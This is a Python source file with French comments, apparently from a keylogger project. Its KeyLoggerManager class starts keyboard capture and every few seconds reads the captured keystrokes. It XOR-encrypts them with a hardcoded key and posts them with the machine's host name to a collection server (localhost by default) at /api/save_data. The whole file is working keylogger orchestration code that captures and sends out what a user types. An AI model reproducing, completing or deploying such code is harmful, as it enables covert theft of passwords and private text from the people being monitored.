# agent/KeyLoggerManager.py
# -*- coding: utf-8 -*-

import threading
import time
import socket
from typing import Optional

from KeyLoggerService import KeyLoggerService
from Encryptor import Encryptor
from NetworkWriter import NetworkWriter


class KeyLoggerManager:
    """
    Manager minimal :
    - démarre l'écoute clavier (KeyLoggerService)
    - toutes les N secondes, récupère le buffer, chiffre (XOR→hex) et envoie (ENC:<hex>) au serveur
    - arrêt propre (ESC ou Ctrl+C)
    """

    def __init__(
        self,
        interval_seconds: int = 10,
        machine_name: Optional[str] = None,
        server_url: str = "http://127.0.0.1:5001",
        secret_key: str = "avi",
    ):
        self.interval = max(1, int(interval_seconds))
        self.machine_name = machine_name or socket.gethostname()
        self.server_url = server_url.rstrip("/")
        self.secret_key = secret_key

        # services
        self.logger = KeyLoggerService(on_escape_callback=self._on_escape)
        self.writer = NetworkWriter(self.server_url)

        # thread de flush
        self._thread: Optional[threading.Thread] = None
        self._running = False

    # ---------- cycle de vie ----------
    def start(self) -> None:
        """Démarre l’écoute et la boucle d’envoi périodique."""
        if self._running:
            return
        self._running = True

        # démarre l’écoute
        self.logger.start_logging()

        # boucle de flush
        self._thread = threading.Thread(target=self._run, name="KeyLoggerFlush", daemon=True)
        self._thread.start()

    def stop(self) -> None:
        """Arrêt propre."""
        if not self._running:
            return
        self._running = False
        try:
            self.logger.stop_logging()
        finally:
            if self._thread and self._thread.is_alive():
                self._thread.join(timeout=2.0)
            self._thread = None
        print("Keylogger stopped.")

    # ---------- callbacks ----------
    def _on_escape(self):
        """Appelé par KeyLoggerService quand ESC est pressé."""
        print("ESC detected -> stopping keylogger…")
        self.stop()

    # ---------- boucle d’envoi ----------
    def _run(self) -> None:
        """Boucle qui s’exécute tant que le manager est actif."""
        while self._running:
            time.sleep(self.interval)
            try:
                plain = self.logger.get_logged_keys()  # récupère & vide le buffer
                if not plain:
                    continue

                # chiffrement côté agent (XOR -> hex)
                cipher_hex = Encryptor.xor_encrypt_hex(plain, self.secret_key)
                # envoi; NetworkWriter poste sur /api/save_data
                # (il est recommandé qu’il accepte déjà 'ENC:<hex>' tel quel)
                if not str(cipher_hex).startswith("ENC:"):
                    payload = "ENC:" + cipher_hex
                else:
                    payload = cipher_hex

                self.writer.send_data(payload, self.machine_name)

            except Exception as e:
                # on n’éteint pas tout pour une erreur réseau ponctuelle
                print(f"[KeyLoggerManager] send error: {e}")
                # on continue la boucle; les prochains envois reprendront